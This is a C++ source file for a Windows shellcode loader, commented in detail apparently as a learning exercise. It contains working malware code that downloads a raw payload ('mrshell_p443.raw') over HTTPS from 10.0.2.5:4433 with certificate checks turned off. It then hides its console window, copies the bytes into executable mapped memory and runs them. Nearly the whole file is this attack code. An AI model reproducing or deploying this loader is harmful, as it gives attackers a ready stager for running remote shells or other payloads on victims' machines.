// Shellcode_http_loader.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include "Winternl.h"

//specify from where we are going to use the some of the includes.
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ntdll")

//buffer size (in bytes) of the payload + 1, a simple "ls -l payload.bin" will reveal the size.
unsigned char code[746];

void dl(const wchar_t* host, short port)
{
	int counter = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;


	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession) {
		hConnect = WinHttpConnect(hSession, (LPCWSTR)host, port, 0);
	}

	//this flags are you to accept a https self-sign certificate
	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID; 

	// Create an HTTP request handle.
	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/mrshell_p443.raw", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	} 

	// This is for accepting self signed Cert.
	/*
	*, this code snippet is setting security options for a WinHTTP request, and if setting these options fails, 
	the program will exit with an exit code of 443. The specific security options and their values would depend
	on the value of dwFlags and how it has been configured elsewhere in the code.
	*/
	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
	{
		exit(443);
	}

	// Send a request and store if its successfull in "bResults".
	if (hRequest) {
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	}

	//if the request is successfull, wait for the sucessfull (true) status code and response headers that has been received.
	if (bResults) {
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}

	// if everything is still ok (true) Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// returns the amount of data, in bytes, available to be read in "dwsize", if this fail, get and print this error.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			//if No more available data, break this while loop
			if (!dwSize)
				break;

			//if we have more data to read
			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];

			/*this code snippet checks if the pszOutBuffer pointer is null(indicating a memory allocation failure), prints an "Out of memory" message,
			and breaks out of a loop if the condition is true.This is a common pattern for handling memory allocation errors in C or C++ programs.	
			*/
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			

			//sets the memory block pointed to by pszOutBuffer to all zeros, effectively clearing its contents.This can be useful for scenarios where 
			// want to ensure that sensitive or previously used data in memory is securely erased, or when initializing memory to a known state.
		
			ZeroMemory(pszOutBuffer, dwSize + 1);
			// Read the Data.
			//check for data corruption, if something happen print this error if not, continue.
			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}

			else
			{
				int i = 0;
				//this code copy the downloaded data to the buffer (code array variable) 1 byte at a time.
				while (i < dwSize)
				{
					// Since the cunks are transferred in 8192 bytes, this check is required for larger buffers
					//check if the counter exceeded the size of the buffer (this means, check if the data has been downloaded then exit the loop, 
					//if not,keep copiyng data to the variable code.
					if (counter >= sizeof(code))
					{
						break;
					}
					//note: char type is 1 byte, you could have used "byte" instead if you want it.
					memcpy(&code[counter], &pszOutBuffer[i], sizeof(char));

					//optional print statement for debugging only
					//printf("i:%d | dwSize:%d | Counter:%d | code char:%c | psz char: %c\n", i, dwSize, counter, code[counter], pszOutBuffer[i]);
					counter++;
					i++;
				}
			}
			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	//printf("[+] %d Bytes successfully written!\n", sizeof(code));

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

   


int main()
{
    //download the binary and  stored in the variable called code.
	dl(L"10.0.2.5", (short)4433);

	//hide window upon execution
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	//create a handle to the file or code
	//Since we dont use a file (suing a variable with the shellcode) the first parameter is invalid_handle_value, as we are no using files,a
	//the second parameter is null, third parameter permissions, high order DWORD memory started in 0 ,i think because is little endian, and low order DWORD memory and last prameter is null 
	//since we are using no file.
	HANDLE memory_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(code), NULL);

	//dedicate a portion of the address space for our shellcode
	void* memory_map = MapViewOfFile(memory_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0X0, 0X0, sizeof(code));

	//copy the shellcode to a memory map we created 
	std::memcpy(memory_map, code, sizeof(code));

	//this is a pointer function, what it does, is go to the beginning of the stack of the memory allocated and execute the code located in the buffer from that stack.
	//in other words execute  whatever is in the momry addres specified.
	std::cout << ((int(*)())memory_map)() << std::endl;

}

